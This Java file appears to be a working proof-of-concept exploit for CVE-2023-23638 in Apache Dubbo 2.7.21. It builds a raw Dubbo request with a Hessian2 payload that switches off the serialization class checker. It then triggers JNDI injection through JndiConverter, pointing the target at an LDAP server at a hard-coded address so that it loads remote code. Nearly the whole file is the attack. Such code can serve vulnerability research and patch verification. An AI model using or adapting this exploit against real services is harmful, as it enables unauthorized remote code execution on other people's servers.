package dubbo.cve;

import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

/**
 * 测试版本: dubbo 2.7.21
 * 修复版本: dubbo 2.7.22
 */
public class CVE_2023_23638 {

    static Boolean False = false;
    static String dubbo_ip = "10.58.120.200";
    static int dubbo_port = 20880;
    static String ldapUri = "ldap://10.58.120.200:1389/492eex";


    public static void main(String[] args) throws Exception{

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 2);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
        Hessian2ObjectOutput body = new Hessian2ObjectOutput(bodyBaos);

        // set body
        body.writeUTF("2.7.6");
        body.writeUTF("com.example.api.DemoService");
        body.writeUTF("");
        body.writeUTF("$invokeAsync");
        body.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");

        body.writeUTF("sayHello");
        body.writeObject(new String[] {"java.lang.String"});

        getRawReturnPayload(body, ldapUri);

        body.flushBuffer();

        Bytes.int2bytes(bodyBaos.size(), header, 12);
        ByteArrayOutputStream totalBaos = new ByteArrayOutputStream();
        totalBaos.write(header);
        totalBaos.write(bodyBaos.toByteArray());

        byte[] bytes = totalBaos.toByteArray();

        Socket socket = new Socket(dubbo_ip, dubbo_port);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }

    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        jndi.put("OPEN_CHECK_CLASS", false);

//        HashMap map = new HashMap();
//        map.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
//        map.put("INSTANCE", jndi);

        HashMap map1 = new HashMap();
        map1.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        map1.put("asText", ldapUri);
//        map1.put("class", "com.sun.rowset.JdbcRowSetImpl");
//        map1.put("dataSourceName", ldapUri);
//        map1.put("autoCommit", "true");

        HashMap map2 = new HashMap();
        map2.put("class", "org.apache.dubbo.common.utils.SerializeClassChecker");
        map2.put("OPEN_CHECK_CLASS", False);
//        map2.put("CLASS_BLOCK_LFU_CACHE", null);
        map2.put("INSTANCE", jndi);
        map2.put("CACHE", map1);
        out.writeObject(new Object[]{map2});

        HashMap map4 = new HashMap();
        map4.put("generic", "raw.return");
        out.writeObject(map4);
    }

}
